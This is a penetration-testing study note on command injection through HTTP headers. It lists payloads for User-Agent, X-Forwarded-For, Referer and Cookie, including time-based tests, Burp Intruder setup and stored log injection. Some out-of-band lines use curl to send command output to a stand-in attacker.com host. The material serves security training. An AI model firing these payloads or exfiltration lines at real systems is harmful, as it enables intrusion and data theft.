---
tags: [vapt, command-injection, intermediate]
difficulty: intermediate
module: "08 - Command Injection"
topic: "08.06 Command Injection via HTTP Headers"
---

# 08.06 — Command Injection via HTTP Headers

## Overview

Applications sometimes log HTTP headers or pass them to OS commands — for analytics, IP geolocation, email notifications, rate limiting, logging, or diagnostics. Common targets are `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Real-IP`, `Cookie`, and custom headers.

```
VULNERABLE SCENARIOS:
  1. Server logs User-Agent to a file using shell command
  2. App uses X-Forwarded-For for geolocation lookup → passes to shell
  3. Email notification includes the user's User-Agent
  4. Admin panel shows raw request headers, processes them
  5. Middleware runs: system("geoip " + request.getHeader("X-Forwarded-For"))
```

---

## High-Value Headers to Test

```
HEADER                  WHY IT MIGHT BE INJECTED
------                  --------------------------
User-Agent              Logged, displayed in admin, browser detection
X-Forwarded-For         IP logging, geolocation, rate limiting
X-Real-IP               Proxy IP passthrough
Referer                 Analytics, access logging
X-Custom-IP-Authorization  App-level IP whitelisting
Cookie                  Session-related processing
X-Originating-IP        Alternative IP header
X-Remote-IP             Another alternative
Accept-Language         Locale detection (sometimes shell-based)
Content-Type            MIME-based processing
```

---

## Testing Headers with Burp

```
1. INTERCEPT A NORMAL REQUEST:
   GET /profile HTTP/1.1
   Host: target.com
   User-Agent: Mozilla/5.0
   Cookie: session=abc123

2. ADD PAYLOAD TO USER-AGENT:
   User-Agent: Mozilla/5.0;id

3. CHECK RESPONSE:
   If uid=33(www-data) appears → INJECTION!

4. TRY ALL HEADERS:
   User-Agent: test;sleep 5
   X-Forwarded-For: 127.0.0.1;sleep 5
   Referer: https://google.com;sleep 5
   
5. BLIND DETECTION (TIME):
   User-Agent: Mozilla;sleep 10
   → 10-second delay = injection confirmed!
```

---

## X-Forwarded-For Injection

```bash
# X-FORWARDED-FOR IS THE MOST COMMON INJECTION POINT:
# Many apps use it for IP-based rate limiting or geolocation lookup

# NORMAL REQUEST:
X-Forwarded-For: 192.168.1.100

# INJECTION:
X-Forwarded-For: 192.168.1.100;id
X-Forwarded-For: 127.0.0.1|id
X-Forwarded-For: 127.0.0.1$(id)
X-Forwarded-For: 127.0.0.1`id`

# BLIND:
X-Forwarded-For: 127.0.0.1;sleep 10

# OOB:
X-Forwarded-For: 127.0.0.1;nslookup abc123.burpcollaborator.net
X-Forwarded-For: 127.0.0.1;curl https://attacker.com/$(whoami)

# BYPASSING IP FORMAT CHECKS:
# If app validates it's an IP first:
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 10.0.0.1      ← multiple IPs (comma-separated)
                             ↑ try injecting in second IP position!
X-Forwarded-For: 127.0.0.1%0aid            ← newline
```

---

## User-Agent Injection

```bash
# NORMAL:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

# INJECT:
User-Agent: Mozilla;id
User-Agent: Test` id `
User-Agent: $(id)
User-Agent: ';id;echo '

# BLIND TIME:
User-Agent: Mozilla;sleep 10

# OOB:
User-Agent: Mozilla;curl https://attacker.com/ua?d=$(id | base64)

# REAL EXAMPLE — LOG ANALYSIS APP:
# App might display User-Agent in admin panel
# Stored XSS is also possible if not sanitized!
# Combined: inject for command injection AND XSS in admin panel
```

---

## Referer Injection

```bash
# NORMAL:
Referer: https://google.com/search?q=something

# INJECT:
Referer: https://google.com;id
Referer: https://google.com/$(id)
Referer: https://google.com`id`

# USE CASE:
# Analytics processing: 
# system("analytics-record " + referer_header)

# BLIND:
Referer: https://google.com;sleep 10
```

---

## Cookie Injection

```bash
# NORMAL:
Cookie: session=abc123; theme=dark

# INJECT VIA COOKIE VALUE:
Cookie: theme=dark;id
Cookie: theme=$(id)
Cookie: lang=en;sleep 5

# NOTE: Cookie injection often requires finding a specific cookie value
# that's processed differently (e.g., preference cookies, language settings)
# Session cookies are usually just validated, not executed
```

---

## HTTP Request Smuggling + Header Injection Combo

```
Some app servers forward all incoming headers to backend processing.
Injecting a custom header can reach backend systems not exposed to the internet.
Combined with HTTP request smuggling → inject headers into other users' requests!
```

---

## Automated Testing with Burp Intruder

```
BURP INTRUDER SETUP FOR HEADER INJECTION:
1. Intercept request → Send to Intruder
2. Attack type: Sniper
3. Mark payload position in each header value
4. Payloads:
   ;id
   ;sleep 5
   |id
   $(id)
   `id`
   &&id
   ;curl https://your-interactsh.com
5. Launch → Check for:
   - Unusual response times (sleep worked)
   - Different response lengths (id output in response)
   - Interactsh incoming requests (OOB confirmation)

AUTOMATED — HTTPX + CUSTOM HEADERS:
httpx -u https://target.com -H "User-Agent: test;id" -H "X-Forwarded-For: 127.0.0.1;id"
```

---

## Log Injection (Stored Command Injection)

```
SCENARIO:
  1. App logs User-Agent to a file
  2. Later, an admin script processes the log:
     while read line; do echo "Processing: $line"; done < access.log
  3. Attacker's User-Agent: $(id) or `id`
  4. When admin runs the script → injected commands execute!

THIS IS "STORED COMMAND INJECTION":
  ✓ Inject payload now (User-Agent)
  ✓ Execution happens later (when log is processed)
  ✓ Often runs as root (admin script)!
  
  Similar to second-order SQL injection!
```

---

## Related Notes
- [[02 - OS Command Injection Linux]] — Linux-specific commands
- [[04 - Blind Command Injection]] — time-based and OOB detection
- [[06 - SQL Injection in HTTP Headers]] — SQLi via headers (parallel technique)
- [[10 - Command Injection to Reverse Shell]] — escalation
